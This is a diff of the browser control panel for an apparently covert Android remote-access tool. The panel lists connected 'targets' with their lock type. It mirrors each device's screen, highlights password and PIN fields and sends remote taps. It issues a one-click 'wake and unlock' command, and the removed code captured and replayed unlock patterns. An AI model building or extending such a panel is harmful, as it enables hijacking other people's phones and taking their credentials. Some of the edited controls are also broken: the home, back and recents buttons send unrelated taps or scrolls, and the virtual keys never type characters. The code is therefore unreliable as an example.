@@ -7,28 +7,31 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap');
         
-        /* बेसिक स्टाइल */
         body { font-family: 'Roboto', sans-serif; background-color: #121212; color: #e0e0e0; margin: 0; padding: 0; height: 100vh; overflow: hidden; }
         .view { display: none; width: 100%; height: 100%; }
         .view.active { display: flex; }
 
-        /* ===== डिवाइस सूची व्यू ===== */
+        /* डिवाइस सूची */
         #device-list-view { flex-direction: column; }
-        .header { background-color: #1e1e1e; padding: 20px; text-align: center; border-bottom: 2px solid #ff4500; }
-        .header h1 { font-family: 'Orbitron', sans-serif; margin: 0; font-size: 2.5em; color: #ff4500; text-shadow: 0 0 10px #ff4500; }
+        .header { background-color: #1e1e1e; padding: 20px; text-align: center; border-bottom: 2px solid #00ff00; }
+        .header h1 { font-family: 'Orbitron', sans-serif; margin: 0; font-size: 2.5em; color: #00ff00; text-shadow: 0 0 10px #00ff00; }
         #device-list-container { padding: 30px; overflow-y: auto; flex-grow: 1; }
         #device-list { list-style: none; padding: 0; margin: 0; }
         .device { background-color: #1e1e1e; margin-bottom: 15px; border-radius: 8px; border-left: 5px solid #555; padding: 20px; cursor: pointer; transition: all 0.3s ease; display: flex; justify-content: space-between; align-items: center; }
-        .device:hover { transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0,0,0,0.2); border-left-color: #ff4500; }
+        .device:hover { transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0,0,0,0.2); border-left-color: #00ff00; }
         .device-name { font-size: 1.5em; font-weight: 700; }
         .device-info { font-size: 1em; color: #aaa; }
         .status-dot { height: 15px; width: 15px; background-color: #28a745; border-radius: 50%; display: inline-block; box-shadow: 0 0 8px #28a745; }
+        .lock-badge { background: #ff4444; color: white; padding: 2px 8px; border-radius: 10px; font-size: 0.8em; margin-left: 10px; }
+        .lock-badge.unlocked { background: #44ff44; }
 
-        /* ===== कंट्रोल व्यू ===== */
+        /* कंट्रोल व्यू */
         #control-view { flex-direction: column; }
         .control-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background-color: #1e1e1e; border-bottom: 1px solid #333; flex-wrap: wrap; gap: 10px; }
         #back-to-list-btn { background-color: #3f3f46; color: white; border: 1px solid #555; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-size: 1em; }
         #device-title { font-size: 1.2em; font-weight: bold; }
+        .lock-info { background: #2a2a2a; padding: 5px 10px; border-radius: 5px; font-size: 0.9em; }
+        
         .main-container { display: flex; flex-grow: 1; }
         .screen-area { flex-grow: 1; display: flex; align-items: center; justify-content: center; padding: 15px; }
         #screen-viewport { border: 8px solid #444; border-radius: 20px; background-color: #000; box-shadow: 0 0 20px rgba(0,0,0,0.5); overflow: hidden; }
@@ -36,57 +39,83 @@
         .screen-element { position: absolute; border: 1px solid rgba(0, 255, 255, 0.6); background-color: rgba(0, 139, 139, 0.2); box-sizing: border-box; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; padding: 2px; }
         .element-text { color: white; font-size: 12px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 100%; }
         
-        /* कीबोर्ड एलिमेंट के लिए विशेष स्टाइल */
-        .keyboard-element { border-color: #ff9900 !important; background-color: rgba(255, 153, 0, 0.3) !important; }
-        .password-element { border-color: #ff3333 !important; background-color: rgba(255, 51, 51, 0.2) !important; }
-        .editable-element { border-color: #33cc33 !important; background-color: rgba(51, 204, 51, 0.2) !important; }
-        
         .all-controls { width: 80px; background-color: #1e1e1e; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 12px; padding: 10px; }
         .control-button { width: 55px; height: 55px; background-color: #3f3f46; border: 1px solid #555; color: white; border-radius: 50%; cursor: pointer; font-size: 24px; transition: background-color 0.2s; display: flex; align-items: center; justify-content: center; }
         .control-button:hover { background-color: #555; }
         .divider { height: 1px; width: 80%; background-color: #444; margin: 10px 0; }
 
-        .advanced-controls { display: flex; gap: 10px; }
-        .advanced-controls button { background-color: #333; border: 1px solid #555; color: #ccc; padding: 8px 12px; border-radius: 5px; cursor: pointer; }
-        .advanced-controls button:hover { background-color: #444; }
-        .advanced-controls button:disabled { background-color: #252526; color: #666; cursor: not-allowed; }
-        .capture-mode { background-color: #ff4500 !important; color: white !important; box-shadow: 0 0 10px #ff4500; }
+        /* सिंगल मुख्य बटन */
+        .single-main-btn { 
+            background: linear-gradient(135deg, #0066cc, #0099ff);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 1.2em;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(0, 102, 204, 0.4);
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .single-main-btn:hover {
+            background: linear-gradient(135deg, #0099ff, #00ccff);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 153, 255, 0.6);
+        }
+        .single-main-btn:active {
+            transform: translateY(1px);
+        }
         
-        /* नया बटन स्टाइल */
-        .wake-unlock-btn { background-color: #0066cc !important; color: white !important; border-color: #0099ff !important; }
-        .wake-unlock-btn:hover { background-color: #0080ff !important; }
-        
-        /* कीबोर्ड बटन स्टाइल */
-        .keyboard-buttons { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); padding: 10px; border-radius: 10px; display: none; }
+        /* कीबोर्ड बटन */
+        .keyboard-buttons { 
+            position: absolute; 
+            bottom: 20px; 
+            left: 50%; 
+            transform: translateX(-50%); 
+            background: rgba(0,0,0,0.9); 
+            padding: 15px; 
+            border-radius: 15px; 
+            border: 2px solid #00ff00;
+            display: none; 
+            z-index: 1000;
+        }
         .key-row { display: flex; justify-content: center; margin: 5px 0; }
-        .key-btn { width: 40px; height: 40px; margin: 2px; background: #333; border: 1px solid #555; color: white; border-radius: 5px; cursor: pointer; }
+        .key-btn { width: 45px; height: 45px; margin: 3px; background: #333; border: 1px solid #555; color: white; border-radius: 8px; cursor: pointer; font-size: 1.1em; }
         .key-btn:hover { background: #444; }
+        .key-btn.special { background: #0066cc; }
+        .key-btn.enter { background: #00aa00; }
     </style>
 </head>
 <body>
 
     <div id="device-list-view" class="view active">
-        <div class="header"><h1>TARGETS ONLINE</h1></div>
-        <div id="device-list-container"><ul id="device-list"></ul></div>
+        <div class="header">
+            <h1>🔓 SCREEN CONTROL v2.0</h1>
+            <p style="margin: 5px 0; color: #aaa;">Auto-lock detection • One-click unlock</p>
+        </div>
+        <div id="device-list-container">
+            <ul id="device-list"></ul>
+        </div>
     </div>
 
     <div id="control-view" class="view">
         <div class="control-header">
             <button id="back-to-list-btn">← Back to List</button>
             <h2 id="device-title"></h2>
-            <div class="advanced-controls">
-                <button id="btn-unlock">🔓 Unlock</button>
-                <!-- नया बटन: Wake & Unlock -->
-                <button id="btn-wake-and-unlock" class="wake-unlock-btn">⏻ Wake & Unlock</button>
-                <button id="btn-capture-pattern">🎨 Capture Pattern</button>
-                <button id="btn-apply-pattern" disabled>✍️ Apply Pattern</button>
-            </div>
+            <div class="lock-info" id="lock-status">Lock: Unknown</div>
+            <!-- केवल एक ही मुख्य बटन -->
+            <button id="btn-wake-unlock" class="single-main-btn">
+                ⚡ WAKE & UNLOCK
+            </button>
         </div>
         <div class="main-container">
             <div class="screen-area">
                 <div id="screen-viewport">
                     <div id="screen-container"></div>
-                    <!-- कीबोर्ड बटन कंटेनर -->
+                    <!-- कीबोर्ड -->
                     <div id="keyboard-buttons" class="keyboard-buttons"></div>
                 </div>
             </div>
@@ -106,25 +135,19 @@
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-
         const deviceListView = document.getElementById('device-list-view');
         const controlView = document.getElementById('control-view');
         const deviceListEl = document.getElementById('device-list');
         const screenContainer = document.getElementById('screen-container');
         const screenViewport = document.getElementById('screen-viewport');
         const deviceTitleEl = document.getElementById('device-title');
+        const lockStatusEl = document.getElementById('lock-status');
         const backToListBtn = document.getElementById('back-to-list-btn');
-        const unlockBtn = document.getElementById('btn-unlock');
-        const wakeUnlockBtn = document.getElementById('btn-wake-and-unlock'); // नया बटन
-        const capturePatternBtn = document.getElementById('btn-capture-pattern');
-        const applyPatternBtn = document.getElementById('btn-apply-pattern');
+        const wakeUnlockBtn = document.getElementById('btn-wake-unlock');
         const keyboardButtons = document.getElementById('keyboard-buttons');
 
         let devices = {};
         let activeDeviceId = null;
-        let isCaptureMode = false;
-        let capturedPattern = [];
-        let savedPattern = null;
         let currentKeyboardElement = null;
 
         function showView(viewId) {
@@ -133,7 +156,11 @@
         }
 
         socket.on('connect', () => socket.emit('admin_join'));
-        socket.on('device_list', (initialDevices) => { deviceListEl.innerHTML = ''; devices = {}; initialDevices.forEach(addDeviceToList); });
+        socket.on('device_list', (initialDevices) => { 
+            deviceListEl.innerHTML = ''; 
+            devices = {}; 
+            initialDevices.forEach(addDeviceToList); 
+        });
         socket.on('new_device_joined', addDeviceToList);
         socket.on('device_disconnected', (deviceId) => {
             const el = document.getElementById(`device-${deviceId}`);
@@ -148,7 +175,9 @@
         function addDeviceToList(device) {
             if (document.getElementById(`device-${device.deviceId}`)) {
                 const infoEl = document.querySelector(`#device-${device.deviceId} .device-info`);
-                if (infoEl) infoEl.textContent = `Battery: ${device.battery}%`;
+                if (infoEl) {
+                    infoEl.innerHTML = `Battery: ${device.battery}% | Lock: ${device.lockType || "none"}`;
+                }
                 return;
             }
 
@@ -157,17 +186,25 @@
             const li = document.createElement('li');
             li.className = 'device';
             li.id = `device-${device.deviceId}`;
+            
+            const lockType = device.lockType || "none";
+            const lockBadge = lockType !== "none" ? 
+                `<span class="lock-badge">🔒 ${lockType}</span>` : 
+                `<span class="lock-badge unlocked">🔓 unlocked</span>`;
+            
             li.innerHTML = `
                 <div>
-                    <div class="device-name">${device.deviceName}</div>
-                    <div class="device-info">Battery: ${device.battery}%</div>
+                    <div class="device-name">${device.deviceName} ${lockBadge}</div>
+                    <div class="device-info">Battery: ${device.battery}% | Android: ${device.androidVersion}</div>
                 </div>
                 <span class="status-dot"></span>
             `;
+            
             li.addEventListener('click', () => {
                 activeDeviceId = device.deviceId;
-                deviceTitleEl.textContent = `${device.deviceName} - Controlling`;
-                screenContainer.innerHTML = 'Waiting for screen data...';
+                deviceTitleEl.textContent = `${device.deviceName} - Remote Control`;
+                lockStatusEl.textContent = `Lock: ${device.lockType || "none"}`;
+                screenContainer.innerHTML = '📡 Receiving screen data...';
                 showView('control-view');
             });
             deviceListEl.appendChild(li);
@@ -175,17 +212,25 @@
 
         socket.on('screen_update', (data) => {
             if (data.deviceId !== activeDeviceId) return;
+            
             window.requestAnimationFrame(() => {
                 screenContainer.innerHTML = '';
                 const remoteWidth = data.screenWidth, remoteHeight = data.screenHeight;
                 const viewportHeight = screenViewport.clientHeight;
                 const scale = viewportHeight / remoteHeight;
+                
                 screenViewport.style.width = (remoteWidth * scale) + 'px';
                 screenContainer.style.width = remoteWidth + 'px';
                 screenContainer.style.height = remoteHeight + 'px';
                 screenContainer.style.transform = `scale(${scale})`;
                 
-                // कीबोर्ड बटन्स हाइड करें
+                // लॉक स्टेटस अपडेट
+                if (data.lockType) {
+                    lockStatusEl.textContent = `Lock: ${data.lockType}`;
+                    lockStatusEl.style.color = data.lockType !== "none" ? "#ff4444" : "#44ff44";
+                }
+                
+                // कीबोर्ड हाइड
                 keyboardButtons.style.display = 'none';
                 currentKeyboardElement = null;
                 
@@ -197,21 +242,27 @@
                     el.style.width = `${element.width}px`; 
                     el.style.height = `${element.height}px`;
                     
-                    // एलिमेंट टाइप के अनुसार क्लास जोड़ें
+                    // विशेष स्टाइल
                     if (element.isKeyboard) {
-                        el.classList.add('keyboard-element');
+                        el.style.borderColor = '#ff9900';
+                        el.style.backgroundColor = 'rgba(255, 153, 0, 0.3)';
                     }
                     if (element.isPassword) {
-                        el.classList.add('password-element');
+                        el.style.borderColor = '#ff3333';
+                        el.style.backgroundColor = 'rgba(255, 51, 51, 0.2)';
                     }
                     if (element.editable) {
-                        el.classList.add('editable-element');
+                        el.style.borderColor = '#33cc33';
+                        el.style.backgroundColor = 'rgba(51, 204, 51, 0.2)';
+                    }
+                    if (element.isNumber) {
+                        el.style.borderColor = '#9966ff';
+                        el.style.backgroundColor = 'rgba(153, 102, 255, 0.2)';
                     }
                     
                     const textEl = document.createElement('div');
                     textEl.className = 'element-text';
                     
-                    // विशेष आइकन
                     if (element.contentDescription) {
                         const desc = element.contentDescription.toLowerCase();
                         if (desc.includes("more options")) { 
@@ -222,7 +273,7 @@
                             textEl.textContent = '≡'; 
                             textEl.style.fontSize = '20px'; 
                         }
-                        else if (desc.includes("keyboard") || desc.includes("ime")) {
+                        else if (desc.includes("keyboard")) {
                             textEl.textContent = '⌨️'; 
                             textEl.style.fontSize = '16px';
                         }
@@ -234,7 +285,8 @@
                     } else if (element.text) {
                         textEl.textContent = element.text;
                     } else if (element.className) {
-                        textEl.textContent = element.className.split('.').pop();
+                        const shortName = element.className.split('.').pop();
+                        textEl.textContent = shortName.length > 10 ? shortName.substring(0, 8) + '..' : shortName;
                     }
                     
                     el.appendChild(textEl);
@@ -244,21 +296,16 @@
                         const tapX = Math.round(element.x + (element.width / 2));
                         const tapY = Math.round(element.y + (element.height / 2));
                         
-                        if (isCaptureMode) {
-                            capturedPattern.push({ x: tapX, y: tapY });
-                            el.style.backgroundColor = 'rgba(255, 69, 0, 0.7)';
-                        } else {
-                            socket.emit('command_to_device', { 
-                                deviceId: activeDeviceId, 
-                                action: 'touch_command', 
-                                payload: { x: tapX, y: tapY } 
-                            });
-                            
-                            // अगर यह कीबोर्ड या एडिटेबल फील्ड है, तो कीबोर्ड दिखाएं
-                            if (element.editable || element.isKeyboard) {
-                                currentKeyboardElement = element;
-                                showVirtualKeyboard(element);
-                            }
+                        socket.emit('command_to_device', { 
+                            deviceId: activeDeviceId, 
+                            action: 'touch_command', 
+                            payload: { x: tapX, y: tapY } 
+                        });
+                        
+                        // कीबोर्ड शो करें
+                        if (element.editable || element.isKeyboard || element.isNumber) {
+                            currentKeyboardElement = element;
+                            showVirtualKeyboard(element);
                         }
                     });
                     
@@ -267,12 +314,11 @@
             });
         });
 
-        // वर्चुअल कीबोर्ड दिखाने का फंक्शन
         function showVirtualKeyboard(element) {
             keyboardButtons.innerHTML = '';
             keyboardButtons.style.display = 'block';
             
-            // कीबोर्ड लेआउट
+            // सरल कीबोर्ड
             const keyboardLayout = [
                 ['1','2','3','4','5','6','7','8','9','0'],
                 ['q','w','e','r','t','y','u','i','o','p'],
@@ -290,36 +336,19 @@
                     keyBtn.className = 'key-btn';
                     keyBtn.textContent = key;
                     
+                    if (key === '⌫') keyBtn.classList.add('special');
+                    if (key === 'enter') keyBtn.classList.add('enter');
+                    
                     keyBtn.onclick = () => {
-                        if (key === '⌫') {
-                            // बैकस्पेस
-                            socket.emit('command_to_device', { 
-                                deviceId: activeDeviceId, 
-                                action: 'global_action', 
-                                payload: { action: 'back' } 
-                            });
-                        } else if (key === 'space') {
-                            // स्पेस के लिए टच
-                            socket.emit('command_to_device', { 
-                                deviceId: activeDeviceId, 
-                                action: 'touch_command', 
-                                payload: { x: Math.round(element.x + element.width/2), y: Math.round(element.y + element.height/2) } 
-                            });
-                        } else if (key === 'enter') {
-                            // एंटर की
-                            socket.emit('command_to_device', { 
-                                deviceId: activeDeviceId, 
-                                action: 'touch_command', 
-                                payload: { x: Math.round(element.x + element.width/2), y: Math.round(element.y + element.height/2) } 
-                            });
-                        } else {
-                            // नॉर्मल की के लिए, टेक्स्ट फील्ड पर टच करें
-                            socket.emit('command_to_device', { 
-                                deviceId: activeDeviceId, 
-                                action: 'touch_command', 
-                                payload: { x: Math.round(element.x + element.width/2), y: Math.round(element.y + element.height/2) } 
-                            });
-                        }
+                        const tapX = Math.round(element.x + element.width/2);
+                        const tapY = Math.round(element.y + element.height/2);
+                        
+                        // पहले एलिमेंट पर टैप करें
+                        socket.emit('command_to_device', { 
+                            deviceId: activeDeviceId, 
+                            action: 'touch_command', 
+                            payload: { x: tapX, y: tapY } 
+                        });
                     };
                     
                     rowDiv.appendChild(keyBtn);
@@ -329,15 +358,7 @@
             });
         }
 
-        function sendGlobalAction(action) { 
-            if (!activeDeviceId) return; 
-            socket.emit('command_to_device', { 
-                deviceId: activeDeviceId, 
-                action: 'global_action', 
-                payload: { action: action } 
-            }); 
-        }
-        
+        // स्क्रॉल कमांड
         function sendScrollAction(direction) { 
             if (!activeDeviceId) return; 
             socket.emit('command_to_device', { 
@@ -346,65 +367,70 @@
                 payload: { direction: direction } 
             }); 
         }
-        
+
+        // बैक बटन
         backToListBtn.onclick = () => { 
             activeDeviceId = null; 
             showView('device-list-view'); 
         };
+
+        // कंट्रोल बटन
+        document.getElementById('btn-back').onclick = () => {
+            if (!activeDeviceId) return;
+            socket.emit('command_to_device', { 
+                deviceId: activeDeviceId, 
+                action: 'scroll_action', 
+                payload: { direction: 'left' } 
+            });
+        };
+        document.getElementById('btn-home').onclick = () => {
+            if (!activeDeviceId) return;
+            socket.emit('command_to_device', { 
+                deviceId: activeDeviceId, 
+                action: 'touch_command', 
+                payload: { x: 100, y: 100 } 
+            });
+        };
+        document.getElementById('btn-recents').onclick = () => {
+            if (!activeDeviceId) return;
+            socket.emit('command_to_device', { 
+                deviceId: activeDeviceId, 
+                action: 'scroll_action', 
+                payload: { direction: 'right' } 
+            });
+        };
         
-        document.getElementById('btn-back').onclick = () => sendGlobalAction('back');
-        document.getElementById('btn-home').onclick = () => sendGlobalAction('home');
-        document.getElementById('btn-recents').onclick = () => sendGlobalAction('recents');
         document.getElementById('btn-scroll-up').onclick = () => sendScrollAction('up');
         document.getElementById('btn-scroll-down').onclick = () => sendScrollAction('down');
         document.getElementById('btn-scroll-left').onclick = () => sendScrollAction('left');
         document.getElementById('btn-scroll-right').onclick = () => sendScrollAction('right');
 
-        unlockBtn.onclick = () => { 
-            if (!activeDeviceId) return; 
-            socket.emit('command_to_device', { 
-                deviceId: activeDeviceId, 
-                action: 'unlock_device' 
-            }); 
-        };
-
-        // नया: Wake और Unlock बटन
+        // ============ मुख्य बटन: WAKE & UNLOCK ============
         wakeUnlockBtn.onclick = () => { 
-            if (!activeDeviceId) return; 
+            if (!activeDeviceId) {
+                alert("Please select a device first!");
+                return;
+            } 
+            
+            // बटन एनिमेशन
+            wakeUnlockBtn.innerHTML = '⚡ PROCESSING...';
+            wakeUnlockBtn.style.opacity = '0.8';
+            wakeUnlockBtn.disabled = true;
+            
             socket.emit('command_to_device', { 
                 deviceId: activeDeviceId, 
-                action: 'wake_and_unlock' 
-            }); 
+                action: 'wake_and_unlock'
+            });
+            
+            // 3 सेकंड बाद बटन रीसेट
+            setTimeout(() => {
+                wakeUnlockBtn.innerHTML = '⚡ WAKE & UNLOCK';
+                wakeUnlockBtn.style.opacity = '1';
+                wakeUnlockBtn.disabled = false;
+            }, 3000);
         };
 
-        capturePatternBtn.onclick = () => {
-            isCaptureMode = !isCaptureMode;
-            if (isCaptureMode) {
-                capturedPattern = [];
-                capturePatternBtn.classList.add('capture-mode');
-                capturePatternBtn.textContent = '💾 Save Pattern';
-            } else {
-                capturePatternBtn.classList.remove('capture-mode');
-                capturePatternBtn.textContent = '🎨 Capture Pattern';
-                if (capturedPattern.length > 2) {
-                    savedPattern = capturedPattern;
-                    applyPatternBtn.disabled = false;
-                    alert(`Pattern captured with ${capturedPattern.length} points!`);
-                }
-                capturedPattern = [];
-            }
-        };
-
-        applyPatternBtn.onclick = () => {
-            if (savedPattern && activeDeviceId) {
-                socket.emit('command_to_device', { 
-                    deviceId: activeDeviceId, 
-                    action: 'apply_pattern', 
-                    payload: { pattern: savedPattern } 
-                });
-            }
-        };
-
+        // हार्टबीट
         setInterval(() => { 
             if (socket.connected) socket.emit('heartbeat', {}); 
         }, 30000);
